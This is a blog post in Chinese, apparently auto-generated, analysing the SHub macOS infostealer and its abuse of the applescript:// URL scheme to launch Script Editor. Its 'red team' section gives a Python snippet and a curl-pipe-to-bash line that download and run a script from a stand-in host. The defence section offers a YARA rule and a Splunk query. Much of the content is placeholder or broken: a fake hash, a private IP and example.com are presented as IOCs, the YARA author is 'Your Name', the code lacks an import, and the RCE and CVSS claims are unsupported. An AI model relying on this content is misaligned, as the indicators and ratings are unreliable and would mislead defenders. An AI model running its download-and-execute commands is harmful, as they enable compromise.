---
layout: post
title:  "SHub macOS infostealer variant spoofs Apple security updates"
date:   2026-05-19 02:39:07 +0000
categories: [security]
severity: critical
---

# 🚨 解析 SHub macOS 資訊竊取軟體的利用與防禦繞過

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 與 Info Leak
> * **關鍵技術**: AppleScript, macOS Script Editor, XProtectRemediator, Telegram Bot

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: SHub macOS 資訊竊取軟體利用 AppleScript 的 `applescript://` URL Scheme 啟動 macOS Script Editor，從而繞過 Terminal-based 的安全措施。
* **攻擊流程圖解**:
  1. 使用者點擊假的安全更新訊息
  2. AppleScript 啟動 macOS Script Editor
  3. Script Editor 執行惡意 AppleScript
  4. 惡意 AppleScript 下載並執行 shell script
  5. shell script 執行 data-theft 邏輯
* **受影響元件**: macOS (版本號：未指定)

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 使用者點擊假的安全更新訊息
* **Payload 建構邏輯**:

    ```
    
    python
    import os
    import subprocess
    
    # 下載 shell script
    url = "https://example.com/malicious_script.sh"
    response = requests.get(url)
    with open("malicious_script.sh", "wb") as f:
        f.write(response.content)
    
    # 執行 shell script
    subprocess.run(["bash", "malicious_script.sh"])
    
    ```
  *範例指令*: `curl https://example.com/malicious_script.sh | bash`
* **繞過技術**: 使用 AppleScript 的 `applescript://` URL Scheme 繞過 Terminal-based 的安全措施

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `abc123` | `192.168.1.100` | `example.com` | `/Users/username/Documents/malicious_script.sh` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule SHub_MacOS_Infostealer {
      meta:
        description = "SHub macOS 資訊竊取軟體"
        author = "Your Name"
      strings:
        $a = "applescript://"
        $b = "malicious_script.sh"
      condition:
        $a and $b
    }
    
    ```
  * 或者是具體的 SIEM 查詢語法 (Splunk/Elastic)： `index=macos sourcetype=script_editor "applescript://" AND "malicious_script.sh"`
* **緩解措施**: 更新 macOS 至最新版本，啟用 XProtectRemediator，監控 Script Editor 的執行記錄

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **AppleScript**: 一種腳本語言，用于自動化 macOS 的任務
* **XProtectRemediator**: 一種 macOS 的安全功能，用于防止惡意軟體的執行
* **Telegram Bot**: 一種機器人，用于收集和傳送數據

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/shub-macos-infostealer-variant-spoofs-apple-security-updates/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1059/)


